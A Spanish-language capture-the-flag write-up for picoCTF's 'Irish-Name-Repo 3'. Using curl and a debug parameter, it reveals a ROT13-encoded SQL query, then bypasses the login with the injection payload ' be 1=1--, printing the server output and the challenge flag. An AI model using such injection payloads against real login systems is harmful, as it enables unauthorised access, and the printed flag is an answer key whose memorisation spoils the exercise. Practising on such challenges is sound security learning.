# Irish-Name-Repo 3


## Descripción
There is a secure website running at `https://jupiter.challenges.picoctf.org/problem/54253/` ([link](https://jupiter.challenges.picoctf.org/problem/54253/)) or http://jupiter.challenges.picoctf.org:54253. Try to see if you can login as admin!

## Pistas
- Seems like the password is encrypted.

## Solución


- Entramos a la pagina web: [link](https://jupiter.challenges.picoctf.org/problem/33850/)  
- Usando la interfaz de depuración, podemos inspeccionar la consulta SQL:
``` bash
┌──(kali㉿kali)-[~/Documentos]
└─$ curl "https://jupiter.challenges.picoctf.org/problem/54253/login.html" --data "password=test&debug=1"
<!doctype html>
<html>
<head>
    <title>Login</title>
    <link rel="stylesheet" type="text/css" href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
</head>
<body>
<div class="container">
    <div class="row">
        <div class="col-md-12">
            <div class="panel panel-primary" style="margin-top:50px">
                <div class="panel-heading">
                    <h3 class="panel-title">Admin Log In</h3>
                </div>
                <div class="panel-body">
                    <form action="login.php" method="POST">
                        <fieldset>
                            <div class="form-group">
                                
                                <label for="password">Password:</label>
                                <div class="controls">
                                    <input type="password" id="password" name="password" class="form-control">
                                </div>
                            </div>
                            <input type="hidden" name="debug" value="0">

                            <div class="form-actions">
                                <input type="submit" value="Login" class="btn btn-primary">
                            </div>
                        </fieldset>
                    </form>
                </div>
            </div>
        </div>
    </div>
</div>
</body>
</html>
                                                                                                                                                            
┌──(kali㉿kali)-[~/Documentos]
└─$ curl "https://jupiter.challenges.picoctf.org/problem/54253/login.php" --data "password=test&debug=1"
<pre>password: test
SQL query: SELECT * FROM admin where password = 'grfg'
</pre><h1>Login failed.</h1>  
```

- La contraseña fue encriptada de alguna manera. Dado el hecho de que `t` fue reemplazado por `g` dos veces, esto podría ser un cifrado de sustitución. Probemos una inyección simple:
``` bash
┌──(kali㉿kali)-[~/Documentos]
└─$ curl "https://jupiter.challenges.picoctf.org/problem/54253/login.php" --data "password=' or 1=1--&debug=1"
<pre>password: ' or 1=1--
SQL query: SELECT * FROM admin where password = '' be 1=1--'
</pre>  
```

- Se intenta, enviando `be` en lugar de `or`:
``` bash
┌──(kali㉿kali)-[~/Documentos]
└─$ curl "https://jupiter.challenges.picoctf.org/problem/54253/login.php" --data "password=' be  1=1--&debug=1" && echo
<pre>password: ' be  1=1--
SQL query: SELECT * FROM admin where password = '' or  1=1--'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{3v3n_m0r3_SQL_7f5767f6}</p>

┌──(kali㉿kali)-[~/Documentos]
└─$ 

```

- Se obtiene la bandera.

## Bandera
picoCTF{3v3n_m0r3_SQL_7f5767f6}


| Concepto | Descripción |
|------ | -------------- |
| or |Siempre es verdadero ||


## Referencias
- [SQL Injection](https://www.w3schools.com/sql/sql_injection.asp)



